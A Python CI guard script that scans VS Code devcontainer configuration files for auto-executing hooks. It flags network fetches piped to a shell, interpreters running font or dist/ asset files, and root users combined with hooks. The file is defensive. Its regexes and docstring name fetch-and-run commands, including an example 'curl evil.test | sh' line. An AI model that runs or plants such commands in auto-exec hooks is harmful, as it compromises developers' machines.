"""Guard C — VS Code Dev Container auto-run configuration.

Detects dangerous *auto-execution* configuration in ``.devcontainer`` files,
which are JSONC and whose ``postCreateCommand`` / ``postStartCommand`` /
``postAttachCommand`` hooks run code automatically when a container is
(re)started. This is a known attack surface: the incident delivered a
JavaScript payload via an auto-executing VS Code task; the same class of
abuse exists for devcontainers.

Scope (explicit, intentionally narrow):
  * files: ``.devcontainer/devcontainer.json``, ``.devcontainer.json``,
    ``.devcontainer/<name>/devcontainer.json`` (no recursion into unrelated
    directories)
  * command value forms accepted by the devcontainer spec:
    - string: a single shell command line
    - array:  a list of shell command lines (each scanned individually;
      arrays execute directly via exec, so argv[0]+argv[1] are also
      recombined for asset-path detection)
    - object: a named-command object. The devcontainer CLI accepts named
      commands under ANY property key (e.g. "command", "setup"), so every
      string/array value is normalized and scanned; empty objects and
      non-string values fail loud
  * signals checked across the *whole* command string (no prefix bypass):
    - pipes a network fetch to a shell: ``curl ... | (sh|bash|pwsh|iex)``,
      ``wget ... | (sh|bash)`` — including after an allow-listed prefix
      (``npm ci && curl evil.test | sh`` is caught)
    - executes a binary/asset path rather than a manifest: ``node
      ./public/fonts/x.woff2``, ``node ./dist/setup.js``
    - ``remoteUser`` / ``containerUser`` set to ``root`` *combined with* any
      exec hook (root alone is not flagged)

ALLOWED patterns (suppress noise only — they do NOT short-circuit danger
checks; a command matching the allow-list is still scanned):
  * npm ci / yarn install / pnpm install (with flags)
  * cargo build / check / fmt / clippy / test (with flags)
  * rustup component add
  * apt-get update / install, apt update / install (incl. sudo)
  * bun install, pip install, deno install

False-positive policy (documented):
  * A devcontainer with no auto-exec hook passes.
  * Valid spec forms (string / array / object) are all understood.
  * ``node ./scripts/x.js`` and other project scripts under ``scripts/``
    are NOT flagged — only asset-like extensions and asset/seed dirs
    (``public/fonts/``, ``dist/``, ``assets/``) are.
  * If ``.devcontainer/`` does not exist, the guard prints
    ``inspected 0 file(s)`` and exits 0 — this repo currently has no
    devcontainer, so the guard is preventive only; its effectiveness is
    verified by fixtures, not a live target.

NOT claimed:
  - Does NOT scan Dockerfile ``RUN``/``ENTRYPOINT`` (separate concern).
  - Does NOT cover user-level VS Code devcontainer overrides, extensions
    that inject tasks, or remote-SSH behavior.
  - Does NOT execute or interpret the commands it inspects.
  - Is NOT a general malware detector — it targets the specific
    auto-execution patterns this incident used.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
from pathlib import Path


# Commands that are ordinary, manifest-driven bootstrap — not suspicious on
# their own. Anchored with $ so an allow-listed tool must be the ENTIRE
# command line; anything appended (&&, ;, newline, env assignment) falls
# through to the danger checks below. NOTE: the allow-list does NOT
# short-circuit danger checks — it only suppresses the "not in allow-list"
# noise for known-good single commands.
SAFE_BOOTSTRAP_PATTERNS: list[str] = [
    r"^\s*npm\s+ci\s*$",
    r"^\s*yarn\s+install\s*(?:--.*)?$",
    r"^\s*pnpm\s+install\s*(?:--.*)?$",
    r"^\s*cargo\s+build\s*(?:--.*)?$",
    r"^\s*cargo\s+check\s*(?:--.*)?$",
    r"^\s*cargo\s+fmt\s*(?:--.*)?$",
    r"^\s*cargo\s+clippy\s*(?:--.*)?$",
    r"^\s*cargo\s+test\s*(?:--.*)?$",
    r"^\s*rustup\s+component\s+add\s+.+$",
    r"^\s*sudo\s+apt-get\s+update\s*$",
    r"^\s*sudo\s+apt-get\s+install\s+-y\s+.+$",
    r"^\s*sudo\s+apt\s+update\s*$",
    r"^\s*sudo\s+apt\s+install\s+-y\s+.+$",
    r"^\s*apt-get\s+update\s*$",
    r"^\s*apt-get\s+install\s+-y\s+.+$",
    r"^\s*apt\s+update\s*$",
    r"^\s*apt\s+install\s+-y\s+.+$",
    r"^\s*bun\s+install\s*$",
    r"^\s*pip\s+install\s+(?:-[^\s]+\s+)*.+$",
    r"^\s*deno\s+install\s*$",
]
_SAFE_BOOTSTRAP = re.compile("|".join(SAFE_BOOTSTRAP_PATTERNS), re.IGNORECASE)

# Suspicious: network-fetch tool piped to a shell, ANYWHERE in the command
# (including after allow-listed prefixes and inside command substitutions).
FETCH_AND_RUN = re.compile(
    r"(?:curl|wget|Invoke-WebRequest|irm)\b.*\|\s*(?:sh|bash|pwsh|iex)\b",
    re.IGNORECASE | re.DOTALL,
)

# Interpreter token (bare name or full path like /usr/bin/node) followed by
# optional short/long flags. \b ensures "mynode" is not mistaken for "node"
# while "/usr/bin/node" is still recognized.
_INTERP = r"\b(?:node|sh|bash|pwsh)\b(?:\s+-{1,2}[\w-]+(?:=\S+)?)*\s+"
# Optional quote immediately around the target path token. The hook value is
# a shell command line, so arguments may be quoted ("dist/setup.js" or
# './public/fonts/x.woff2'). The quote is matched as an argument boundary
# (only adjacent to the path token) rather than stripped from the whole
# command, so argument boundaries and shell semantics stay intact.
_Q = r"[\"']?"

# Suspicious: execute a binary/asset path rather than a manifest tool.
# Narrowed so legitimate project scripts (node ./scripts/x.js) pass.
RUNS_ASSET = re.compile(
    # interpreter (with optional flags) + path with an asset-like extension
    _INTERP + _Q + r"\S*\.(?:woff2?|ttf|otf|eot|llf)\b[\"']?(?:\s|$|;|&|\|)",
    re.IGNORECASE,
)
# interpreter + a .js/.mjs/.cjs under an asset/seed directory (the incident
# shape). The path may be bare ("dist/setup.js"), ./-prefixed, nested under
# another directory ("app/dist/setup.js"), or use traversal
# ("./scripts/../dist/setup.js").
RUNS_ASSET_SEED = re.compile(
    _INTERP + _Q + r"(?:[^\s]*/)?(?:dist|public/fonts|assets)/"
    r"\S*\.(?:js|mjs|cjs)\b",
    re.IGNORECASE,
)
# interpreter + ./path with .js that is NOT under scripts/ (project scripts)
RUNS_ASSET_DOT_JS = re.compile(
    _INTERP + _Q + r"\./+(?!scripts/)\S*\.js\b",
    re.IGNORECASE,
)

HOOK_KEYS = (
    "postCreateCommand", "postStartCommand", "postAttachCommand",
    "onCreateCommand", "initializeCommand", "updateContentCommand",
)


def _candidate_files() -> list[str]:
    """Return likely devcontainer.json paths relative to repo root.

    Does NOT recurse into arbitrary directories.
    """
    return [
        ".devcontainer/devcontainer.json",
        ".devcontainer.json",
    ]


def _devcontainer_dirs(root: str) -> list[str]:
    """Named devcontainer folders under .devcontainer/ (e.g. .devcontainer/name/)."""
    base = os.path.join(root, ".devcontainer")
    out: list[str] = []
    if os.path.isdir(base):
        for name in os.listdir(base):
            p = os.path.join(base, name, "devcontainer.json")
            if os.path.isdir(os.path.join(base, name)) and os.path.isfile(p):
                out.append(p)
    return out


def strip_jsonc(text: str) -> str:
    """Minimal JSONC stripper: removes // and /* */ comments + trailing commas."""
    out: list[str] = []
    i, n = 0, len(text)
    in_str, esc = False, False
    while i < n:
        ch = text[i]
        if in_str:
            out.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            i += 1
            continue
        if ch == '"':
            in_str = True
            out.append(ch)
            i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "/":
            while i < n and text[i] not in "\r\n":
                i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "*":
            i += 2
            while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(ch)
        i += 1
    stripped = "".join(out)
    cleaned: list[str] = []
    j, m = 0, len(stripped)
    in_str, esc = False, False
    while j < m:
        ch = stripped[j]
        if in_str:
            cleaned.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            j += 1
            continue
        if ch == '"':
            in_str = True
            cleaned.append(ch)
            j += 1
            continue
        if ch == ",":
            k = j + 1
            while k < m and stripped[k] in " \t\r\n":
                k += 1
            if k < m and stripped[k] in "}]":
                j += 1
                continue
        cleaned.append(ch)
        j += 1
    return "".join(cleaned)


def _normalize_commands(val, key: str = "", rel: str = "",
                        errors: list[str] | None = None) -> list[str]:
    """Extract command strings from a devcontainer hook value.

    Accepts every form the devcontainer spec allows:
      - str  -> returned as-is (one command)
      - list -> each element is a separate command line (array form; arrays
        execute directly via exec, so argv[0]+argv[1] are also recombined for
        asset-path detection — see check_devcontainer)
      - dict -> a named-command object. The devcontainer CLI accepts named
        commands under *any* property key (e.g. "command", "setup", ...), so
        EVERY string/list/dict value is normalized and scanned. Empty objects
        and non-string values are reported via ``errors`` rather than silently
        skipped.
    """
    if isinstance(val, str):
        return [val]
    if isinstance(val, list):
        # Per the devcontainer spec, an array-form hook is a list of *strings*
        # (an argv, executed directly without a shell). We do NOT stringify
        # numbers, objects, or null into command text — an element of the wrong
        # type is a malformed hook and fails closed with a specific diagnostic.
        cmds: list[str] = []
        for p in val:
            if isinstance(p, str):
                cmds.append(p)
            elif errors is not None:
                errors.append(
                    f"{rel}: {key} array-form command has an unsupported "
                    f"element of type {type(p).__name__} (expected a string)"
                )
        return cmds
    if isinstance(val, dict):
        cmds: list[str] = []
        saw_value = False
        for sub in val.values():
            if sub is None:
                continue
            if isinstance(sub, (str, list, dict)):
                saw_value = True
                cmds.extend(_normalize_commands(sub, key, rel, errors))
            elif errors is not None:
                errors.append(
                    f"{rel}: {key} named-command object has an unsupported "
                    f"value of type {type(sub).__name__} "
                    f"(expected string or array of strings)"
                )
        if not saw_value and errors is not None:
            errors.append(
                f"{rel}: {key} is an empty named-command object; "
                f"refusing to treat as safe"
            )
        return cmds
    return []


def _split_shell_cmd(cmd: str) -> list[tuple[str, str]]:
    """Split a shell command line into (raw_token, unquoted_token) pairs.

    Respects single and double quotes. Quoted arguments are returned with
    both the raw form (including quotes) and the unquoted form.
    """
    tokens: list[tuple[str, str]] = []
    i, n = 0, len(cmd)
    while i < n:
        if cmd[i].isspace():
            i += 1
            continue
        start = i
        parts: list[str] = []
        while i < n and not cmd[i].isspace():
            ch = cmd[i]
            if ch in ("'", '"'):
                quote = ch
                i += 1
                buf: list[str] = []
                while i < n and cmd[i] != quote:
                    buf.append(cmd[i])
                    i += 1
                if i < n:
                    i += 1
                parts.append("".join(buf))
            else:
                parts.append(ch)
                i += 1
        raw = cmd[start:i]
        tokens.append((raw, "".join(parts)))
    return tokens


def _dequote(cmd: str) -> str:
    """Command with shell quotes removed, for argument-boundary-insensitive scans.

    ``node "dist/setup.js"`` and ``node 'dist/setup.js'`` must be scanned the
    same way as the unquoted spelling; the regexes match on the path token, so
    quotes would otherwise sit between the interpreter and the path and hide it.
    """
    return " ".join(val for _raw, val in _split_shell_cmd(cmd))


def _is_safe_bootstrap(cmd: str) -> bool:
    """True only if the *entire* command matches an allow-listed pattern."""
    return _SAFE_BOOTSTRAP.match(cmd) is not None


def check_command(cmd: str, key: str, rel: str, errors: list[str]) -> None:
    """Run all danger-pattern checks against a full command string.

    The allow-list does NOT short-circuit — danger patterns are always
    evaluated on the whole string, so 'npm ci && curl | sh' is caught.
    """
    cmd = cmd.strip()
    if not cmd:
        return

    problems: list[str] = []
    # Scan the dequoted form so quoted arguments ("dist/setup.js") are caught
    # the same way as unquoted ones.
    scan = _dequote(cmd)
    if FETCH_AND_RUN.search(scan):
        problems.append(f"pipes a network fetch to a shell ({cmd[:80]!r})")
    if RUNS_ASSET.search(scan):
        problems.append(f"executes a binary/asset path ({cmd[:80]!r})")
    if RUNS_ASSET_SEED.search(scan):
        problems.append(
            f"executes a .js file from an asset/seed directory ({cmd[:80]!r})"
        )
    if RUNS_ASSET_DOT_JS.search(scan):
        problems.append(
            f"executes a .js file outside scripts/ ({cmd[:80]!r})"
        )

    for p in problems:
        errors.append(f"{rel}: {key} {p}")


def check_devcontainer(path: str, errors: list[str], rel: str) -> None:
    """Inspect a single devcontainer.json. Appends human-readable error strings."""
    try:
        raw = Path(path).read_text(encoding="utf-8")
    except OSError as exc:
        errors.append(f"{rel}: cannot read file: {exc}")
        return
    try:
        data = json.loads(strip_jsonc(raw))
    except json.JSONDecodeError as exc:
        errors.append(f"{rel}: invalid JSON/JSONC: {exc}")
        return
    if not isinstance(data, dict):
        errors.append(f"{rel}: top-level JSON must be an object")
        return

    hooks_found: list[str] = []
    for key in HOOK_KEYS:
        val = data.get(key)
        if val is None:
            continue
        if not isinstance(val, (str, list, dict)):
            errors.append(
                f"{rel}: {key} must be a string, array, or object, "
                f"got {type(val).__name__}"
            )
            continue

        cmds = _normalize_commands(val, key, rel, errors)
        if not cmds:
            # A specific diagnostic was already appended by _normalize_commands
            # for the malformed element; only add the generic one when the
            # value was an empty/unsupported object shape.
            if not any(key in e for e in errors):
                errors.append(
                    f"{rel}: {key} is an unsupported named-command shape "
                    f"(empty object or non-string command value); refusing to "
                    f"treat it as safe"
                )
            continue
        hooks_found.append(key)

        if isinstance(val, list):
            # Array form executes directly via exec (no shell). Detect
            # interpreter+path across argv elements, which the per-element
            # scan alone misses. Only well-formed string argv participates.
            argv = [p for p in val if isinstance(p, str)]
            if len(argv) >= 2 and argv[0].lower() in ("node", "sh", "bash", "pwsh") \
                    and not argv[1].startswith("-"):
                check_command(f"{argv[0]} {argv[1]}", key, rel, errors)

        for cmd in cmds:
            check_command(cmd, key, rel, errors)

    # root user only matters if combined with an exec hook
    user = data.get("remoteUser") or data.get("containerUser")
    if user in ("root", "0") and hooks_found:
        errors.append(
            f"{rel}: runs as root (remoteUser/containerUser={user}) combined with "
            f"auto-exec hooks: {', '.join(hooks_found)}"
        )


def main() -> int:
    parser = argparse.ArgumentParser(description="devcontainer auto-run guard")
    parser.add_argument("--root", default=".", help="repository root")
    parser.add_argument("--paths", nargs="*", default=None,
                        help="explicit devcontainer.json paths (fail loud if any missing)")
    args = parser.parse_args()

    errors: list[str] = []
    inspected: list[str] = []

    if args.paths:
        missing = [p for p in args.paths if not os.path.isfile(p)]
        if missing:
            for p in missing:
                print(f"::error file={p}::explicitly requested devcontainer.json path does not exist")
            return 1
        targets = [(p, os.path.relpath(p, args.root)) for p in args.paths]
    else:
        targets = []
        for rel in _candidate_files():
            abs_p = os.path.join(args.root, rel)
            if os.path.isfile(abs_p):
                targets.append((abs_p, rel))
        for abs_p in _devcontainer_dirs(args.root):
            try:
                rel = os.path.relpath(abs_p, args.root)
            except ValueError:
                rel = abs_p
            targets.append((abs_p, rel))

    for path, rel in targets:
        if os.path.isfile(path):
            inspected.append(rel)
            check_devcontainer(path, errors, rel)

    for err in errors:
        print(f"::error::{err}")
    print(f"inspected {len(inspected)} devcontainer file(s), {len(errors)} problem(s)")
    return 1 if errors else 0


if __name__ == "__main__":
    sys.exit(main())
